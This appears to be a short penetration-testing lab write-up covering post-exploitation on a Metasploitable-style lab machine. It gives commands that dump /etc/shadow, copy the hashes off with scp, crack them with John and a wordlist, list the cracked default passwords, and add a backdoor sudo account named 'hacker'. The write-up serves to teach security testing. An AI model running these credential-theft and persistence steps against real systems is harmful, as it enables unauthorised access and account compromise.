 Phase 3 â€“ Post-Exploitation

Objective:

The goal of this phase was to assess the depth of access gained and determine what further actions an attacker could take after initial compromise.

Identity Confirmation:

      whoami
      id
      uname -a

Dump Password Hashes:

      cat /etc/shadow > /home/msfadmin/hashes.txt
      scp msfadmin@192.168.56.102:/home/msfadmin/hashes.txt .

Crack Hashes with John:

      john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

Cracked Passwords:

      Username                  Password
      
      user                        user
      
    
      service                    service
      
      
      postgres                   postgres
      
      
     
      msfadmin                   msfadmin
      
      
      klog                        123456789
      
     
      sys                          batman
      
     

Persistence:
      sudo useradd hacker -m -s /bin/bash
      sudo passwd hacker
      sudo usermod -aG sudo hacker
